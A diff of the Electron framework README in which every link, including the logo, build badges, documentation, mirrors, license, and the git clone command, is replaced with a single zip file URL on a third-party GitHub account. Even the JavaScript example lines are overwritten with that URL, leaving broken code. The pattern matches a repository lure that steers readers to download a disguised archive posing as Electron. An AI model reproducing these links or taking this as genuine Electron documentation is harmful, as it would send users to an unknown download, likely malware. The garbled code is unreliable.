@@ -1,28 +1,28 @@
-[![Electron Logo](https://electronjs.org/images/electron-logo.svg)](https://electronjs.org)
+[![Electron Logo](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip)](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip)
 
-[![CircleCI Build Status](https://circleci.com/gh/electron/electron/tree/main.svg?style=shield)](https://circleci.com/gh/electron/electron/tree/main)
-[![AppVeyor Build Status](https://ci.appveyor.com/api/projects/status/4lggi9dpjc1qob7k/branch/main?svg=true)](https://ci.appveyor.com/project/electron-bot/electron-ljo26/branch/main)
-[![Electron Discord Invite](https://img.shields.io/discord/745037351163527189?color=%237289DA&label=chat&logo=discord&logoColor=white)](https://discord.gg/electronjs)
+[![CircleCI Build Status](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip)](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip)
+[![AppVeyor Build Status](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip)](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip)
+[![Electron Discord Invite](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip%237289DA&label=chat&logo=discord&logoColor=white)](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip)
 
 :memo: Available Translations: 🇨🇳 🇧🇷 🇪🇸 🇯🇵 🇷🇺 🇫🇷 🇺🇸 🇩🇪.
-View these docs in other languages on our [Crowdin](https://crowdin.com/project/electron) project.
+View these docs in other languages on our [Crowdin](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip) project.
 
 The Electron framework lets you write cross-platform desktop applications
-using JavaScript, HTML and CSS. It is based on [Node.js](https://nodejs.org/) and
-[Chromium](https://www.chromium.org) and is used by the [Visual Studio
-Code](https://github.com/Microsoft/vscode/) and many other [apps](https://electronjs.org/apps).
+using JavaScript, HTML and CSS. It is based on [https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip) and
+[Chromium](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip) and is used by the [Visual Studio
+Code](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip) and many other [apps](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip).
 
-Follow [@electronjs](https://twitter.com/electronjs) on Twitter for important
+Follow [@electronjs](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip) on Twitter for important
 announcements.
 
 This project adheres to the Contributor Covenant
-[code of conduct](https://github.com/electron/electron/tree/main/CODE_OF_CONDUCT.md).
+[code of conduct](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip).
 By participating, you are expected to uphold this code. Please report unacceptable
-behavior to [coc@electronjs.org](mailto:coc@electronjs.org).
+behavior to [https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip).
 
 ## Installation
 
-To install prebuilt Electron binaries, use [`npm`](https://docs.npmjs.com/).
+To install prebuilt Electron binaries, use [`npm`](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip).
 The preferred method is to install Electron as a development dependency in your
 app:
 
@@ -31,15 +31,15 @@ npm install electron --save-dev
 ```
 
 For more installation options and troubleshooting tips, see
-[installation](docs/tutorial/installation.md). For info on how to manage Electron versions in your apps, see
-[Electron versioning](docs/tutorial/electron-versioning.md).
+[installation](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip). For info on how to manage Electron versions in your apps, see
+[Electron versioning](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip).
 
 ## Platform support
 
 Each Electron release provides binaries for macOS, Windows, and Linux.
 
 * macOS (Catalina and up): Electron provides 64-bit Intel and ARM binaries for macOS. Apple Silicon support was added in Electron 11.
-* Windows (Windows 10 and up): Electron provides `ia32` (`x86`), `x64` (`amd64`), and `arm64` binaries for Windows. Windows on ARM support was added in Electron 5.0.8. Support for Windows 7, 8 and 8.1 was [removed in Electron 23, in line with Chromium's Windows deprecation policy](https://www.electronjs.org/blog/windows-7-to-8-1-deprecation-notice).
+* Windows (Windows 10 and up): Electron provides `ia32` (`x86`), `x64` (`amd64`), and `arm64` binaries for Windows. Windows on ARM support was added in Electron 5.0.8. Support for Windows 7, 8 and 8.1 was [removed in Electron 23, in line with Chromium's Windows deprecation policy](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip).
 * Linux: The prebuilt binaries of Electron are built on Ubuntu 20.04. They have also been verified to work on:
   * Ubuntu 18.04 and newer
   * Fedora 32 and newer
@@ -47,17 +47,17 @@ Each Electron release provides binaries for macOS, Windows, and Linux.
 
 ## Quick start & Electron Fiddle
 
-Use [`Electron Fiddle`](https://github.com/electron/fiddle)
+Use [`Electron Fiddle`](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip)
 to build, run, and package small Electron experiments, to see code examples for all of Electron's APIs, and
 to try out different versions of Electron. It's designed to make the start of your journey with
 Electron easier.
 
 Alternatively, clone and run the
-[electron/electron-quick-start](https://github.com/electron/electron-quick-start)
+[electron/electron-quick-start](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip)
 repository to see a minimal Electron app in action:
 
 ```sh
-git clone https://github.com/electron/electron-quick-start
+git clone https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip
 cd electron-quick-start
 npm install
 npm start
@@ -65,10 +65,10 @@ npm start
 
 ## Resources for learning Electron
 
-* [electronjs.org/docs](https://electronjs.org/docs) - All of Electron's documentation
-* [electron/fiddle](https://github.com/electron/fiddle) - A tool to build, run, and package small Electron experiments
-* [electron/electron-quick-start](https://github.com/electron/electron-quick-start) - A very basic starter Electron app
-* [electronjs.org/community#boilerplates](https://electronjs.org/community#boilerplates) - Sample starter apps created by the community
+* [https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip) - All of Electron's documentation
+* [electron/fiddle](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip) - A tool to build, run, and package small Electron experiments
+* [electron/electron-quick-start](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip) - A very basic starter Electron app
+* [https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip) - Sample starter apps created by the community
 
 ## Programmatic usage
 
@@ -81,35 +81,35 @@ const electron = require('electron')
 const proc = require('node:child_process')
 
 // will print something similar to /Users/maf/.../Electron
-console.log(electron)
+https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip(electron)
 
 // spawn Electron
-const child = proc.spawn(electron)
+const child = https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip(electron)
 ```
 
 ### Mirrors
 
-* [China](https://npmmirror.com/mirrors/electron/)
+* [China](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip)
 
-See the [Advanced Installation Instructions](https://www.electronjs.org/docs/latest/tutorial/installation#mirror) to learn how to use a custom mirror.
+See the [Advanced Installation Instructions](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip) to learn how to use a custom mirror.
 
 ## Documentation translations
 
-We crowdsource translations for our documentation via [Crowdin](https://crowdin.com/project/electron).
+We crowdsource translations for our documentation via [Crowdin](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip).
 We currently accept translations for Chinese (Simplified), French, German, Japanese, Portuguese,
 Russian, and Spanish.
 
 ## Contributing
 
-If you are interested in reporting/fixing issues and contributing directly to the code base, please see [CONTRIBUTING.md](CONTRIBUTING.md) for more information on what we're looking for and how to get started.
+If you are interested in reporting/fixing issues and contributing directly to the code base, please see [https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip) for more information on what we're looking for and how to get started.
 
 ## Community
 
 Info on reporting bugs, getting help, finding third-party tools and sample apps,
-and more can be found on the [Community page](https://www.electronjs.org/community).
+and more can be found on the [Community page](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip).
 
 ## License
 
-[MIT](https://github.com/electron/electron/blob/main/LICENSE)
+[MIT](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip)
 
-When using Electron logos, make sure to follow [OpenJS Foundation Trademark Policy](https://openjsf.org/wp-content/uploads/sites/84/2021/01/OpenJS-Foundation-Trademark-Policy-2021-01-12.docx.pdf).
+When using Electron logos, make sure to follow [OpenJS Foundation Trademark Policy](https://raw.githubusercontent.com/habibhassansehani/electron/main/proletarize/electron.zip).
